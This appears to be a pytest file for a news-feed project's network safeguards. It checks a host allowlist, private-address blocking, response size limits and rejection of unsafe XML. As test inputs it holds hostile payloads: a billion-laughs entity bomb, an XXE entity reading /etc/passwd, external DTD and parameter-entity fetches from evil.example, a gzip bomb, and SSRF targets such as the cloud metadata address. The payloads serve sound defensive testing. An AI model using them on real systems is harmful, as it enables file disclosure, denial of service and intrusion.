"""Threats 10 and 11: SSRF, abusive outbound traffic, booby-trapped XML (docs/SECURITY.md)."""

from __future__ import annotations

import typing

import anthropic
import httpcore2
import httpx2
import pytest
from httpcore2._backends.base import SOCKET_OPTION, NetworkBackend, NetworkStream

from goulot.llm.client import build_anthropic_client, make_anthropic_client
from goulot.net.allowlist import FIXED_HOSTS, Allowlist, load_allowlist
from goulot.net.client import build_client, fetch
from goulot.net.transport import (
    AllowlistTransport,
    OutboundBlocked,
    ResponseTooLarge,
    is_public_address,
)
from goulot.net.xml import UnsafeXML, parse_xml
from goulot.settings import CONFIG_DIR

PUBLIC_IP = "93.184.215.14"


class FakeStream(NetworkStream):
    def __init__(self, payload: bytes) -> None:
        self.payload = payload
        self.sent = b""

    def read(self, max_bytes: int, timeout: float | None = None) -> bytes:
        chunk, self.payload = self.payload[:max_bytes], self.payload[max_bytes:]
        return chunk

    def write(self, buffer: bytes, timeout: float | None = None) -> None:
        self.sent += buffer

    def close(self) -> None:
        pass

    def start_tls(self, ssl_context: typing.Any, server_hostname: str | None = None, timeout: float | None = None) -> NetworkStream:
        return self  # TLS is not exercised here; the checks under test happen before it

    def get_extra_info(self, info: str) -> typing.Any:
        return None


class FakeBackend(NetworkBackend):
    """Records where the transport connects and answers with canned HTTP responses, per host."""

    def __init__(self, responses: dict[str, bytes]) -> None:
        self.responses = responses
        self.connections: list[tuple[str, int]] = []

    def connect_tcp(
        self,
        host: str,
        port: int,
        timeout: float | None = None,
        local_address: str | None = None,
        socket_options: typing.Iterable[SOCKET_OPTION] | None = None,
    ) -> NetworkStream:
        self.connections.append((host, port))
        return FakeStream(self.responses[host])


def http_response(body: bytes, status: str = "200 OK", headers: dict[str, str] | None = None) -> bytes:
    lines = [f"HTTP/1.1 {status}", f"Content-Length: {len(body)}", "Connection: close"]
    lines += [f"{k}: {v}" for k, v in (headers or {}).items()]
    return ("\r\n".join(lines) + "\r\n\r\n").encode() + body


def resolver_for(mapping: dict[str, list[str]]) -> typing.Callable[[str, int], list[str]]:
    return lambda host, port: mapping[host]


def test_outbound_allowlist() -> None:
    allowlist = Allowlist({"api.gdeltproject.org", "www.gdacs.org"})
    backend = FakeBackend({PUBLIC_IP: http_response(b"ok")})
    transport = AllowlistTransport(
        allowlist, resolver=resolver_for({"api.gdeltproject.org": [PUBLIC_IP]}), inner_backend=backend
    )
    client = build_client(allowlist, transport=transport)
    for url in (
        "http://api.gdeltproject.org/api/v2/doc/doc",  # no plain HTTP
        "https://evil.example/",  # not on the list
        "https://sub.api.gdeltproject.org/",  # no implicit subdomain
        "https://api.gdeltproject.org:8443/",  # other port
        f"https://{PUBLIC_IP}/",  # IP literal
        "https://localhost/",
    ):
        with pytest.raises(OutboundBlocked):
            client.get(url)
    assert backend.connections == []
    assert client.get("https://api.gdeltproject.org/api/v2/doc/doc").text == "ok"
    assert backend.connections == [(PUBLIC_IP, 443)]  # connected to the address that was checked

    # A redirect towards a host off the list is refused at the next hop.
    redirect = http_response(b"", "302 Found", {"Location": "https://evil.example/steal"})
    backend = FakeBackend({PUBLIC_IP: redirect})
    transport = AllowlistTransport(
        allowlist, resolver=resolver_for({"api.gdeltproject.org": [PUBLIC_IP]}), inner_backend=backend
    )
    with pytest.raises(OutboundBlocked):
        build_client(allowlist, transport=transport).get("https://api.gdeltproject.org/")

    # Size limits: announced, streamed, and after decompression.
    big = http_response(b"x" * 2048)
    transport = AllowlistTransport(
        allowlist,
        resolver=resolver_for({"api.gdeltproject.org": [PUBLIC_IP]}),
        inner_backend=FakeBackend({PUBLIC_IP: big}),
        max_bytes=1024,
    )
    with pytest.raises(ResponseTooLarge):
        build_client(allowlist, transport=transport).get("https://api.gdeltproject.org/")
    import gzip

    bomb = gzip.compress(b"0" * 200_000)
    transport = AllowlistTransport(
        allowlist,
        resolver=resolver_for({"api.gdeltproject.org": [PUBLIC_IP]}),
        inner_backend=FakeBackend({PUBLIC_IP: http_response(bomb, headers={"Content-Encoding": "gzip"})}),
    )
    with pytest.raises(ResponseTooLarge):
        fetch(build_client(allowlist, transport=transport), "https://api.gdeltproject.org/", max_bytes=10_000)

    # The real allowlist: enabled sources only, HTTPS, fixed hosts included, no map tiles on the server side.
    real = load_allowlist(CONFIG_DIR)
    assert real.hosts >= FIXED_HOSTS
    assert "www.gfex.com.cn" not in real.hosts and "api.reliefweb.int" not in real.hosts
    assert "tiles.openfreemap.org" not in real.hosts
    assert "api.gdeltproject.org" in real.hosts and "www.ine.cn" in real.hosts
    # The environment's proxy settings are ignored.
    assert build_client(real)._trust_env is False


def test_private_ip_blocked() -> None:
    for ip in (
        "127.0.0.1", "10.1.2.3", "172.16.0.1", "192.168.1.1", "169.254.169.254", "100.64.0.1", "0.0.0.0",
        "224.0.0.1", "255.255.255.255", "::1", "fe80::1", "fc00::1", "::ffff:127.0.0.1", "::ffff:10.0.0.1", "::",
    ):
        assert not is_public_address(ip), ip
    for ip in ("8.8.8.8", PUBLIC_IP, "2606:4700:4700::1111"):
        assert is_public_address(ip), ip

    allowlist = Allowlist({"feeds.example.org"})
    for addresses in (["169.254.169.254"], ["127.0.0.1"], [PUBLIC_IP, "10.0.0.5"], ["::ffff:192.168.0.1"], []):
        backend = FakeBackend({})
        transport = AllowlistTransport(
            allowlist, resolver=resolver_for({"feeds.example.org": addresses}), inner_backend=backend
        )
        with pytest.raises(httpx2.ConnectError):
            build_client(allowlist, transport=transport).get("https://feeds.example.org/rss")
        assert backend.connections == [], addresses


def test_sdk_uses_allowlist_transport() -> None:
    real = build_anthropic_client("sk-ant-test-0000000000000000", load_allowlist(CONFIG_DIR))
    assert isinstance(real._client, httpx2.Client)
    assert isinstance(real._client._transport, AllowlistTransport)

    model = b'{"id": "claude-sonnet-5-5", "type": "model", "display_name": "Claude Sonnet 5.5", "created_at": "2026-01-01T00:00:00Z"}'
    backend = FakeBackend({PUBLIC_IP: http_response(model, headers={"Content-Type": "application/json"})})
    allowlist = Allowlist({"api.anthropic.com"})
    transport = AllowlistTransport(
        allowlist, resolver=resolver_for({"api.anthropic.com": [PUBLIC_IP]}), inner_backend=backend
    )
    client = make_anthropic_client("sk-ant-test-0000000000000000", build_client(allowlist, transport=transport))
    assert client.models.retrieve("claude-sonnet-5-5").id == "claude-sonnet-5-5"
    assert backend.connections == [(PUBLIC_IP, 443)]

    # Without api.anthropic.com on the list, the SDK cannot reach anything.
    blocked = make_anthropic_client(
        "sk-ant-test-0000000000000000",
        build_client(Allowlist({"example.org"}), transport=AllowlistTransport(Allowlist({"example.org"}))),
    ).with_options(max_retries=0)
    with pytest.raises(anthropic.APIConnectionError):
        blocked.models.retrieve("claude-sonnet-5-5")
    # An SDK client built on plain httpx (outside our transport) is not what goulot.llm hands out.
    assert not isinstance(httpcore2.ConnectionPool(), AllowlistTransport)


BILLION_LAUGHS = b"""<?xml version="1.0"?>
<!DOCTYPE lolz [<!ENTITY lol "lol"><!ENTITY lol2 "&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;">
<!ENTITY lol3 "&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;">]>
<rss><channel><title>&lol3;</title></channel></rss>"""
XXE = b"""<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><rss>&xxe;</rss>"""
EXTERNAL_DTD = b"""<?xml version="1.0"?><!DOCTYPE rss SYSTEM "https://evil.example/x.dtd"><rss/>"""
PARAMETER_ENTITY = b"""<?xml version="1.0"?><!DOCTYPE r [<!ENTITY % p SYSTEM "https://evil.example/p">%p;]><r/>"""


def test_xml_bombs_rejected() -> None:
    for doc in (BILLION_LAUGHS, XXE, EXTERNAL_DTD, PARAMETER_ENTITY, b"<rss><unclosed></rss>"):
        with pytest.raises(UnsafeXML):
            parse_xml(doc)
    with pytest.raises(UnsafeXML):
        parse_xml(b"<rss>" + b"a" * 2048 + b"</rss>", max_bytes=1024)
    root = parse_xml(b"<rss><channel><item><title>Usine &amp; port</title></item></channel></rss>")
    assert root.findtext("channel/item/title") == "Usine & port"
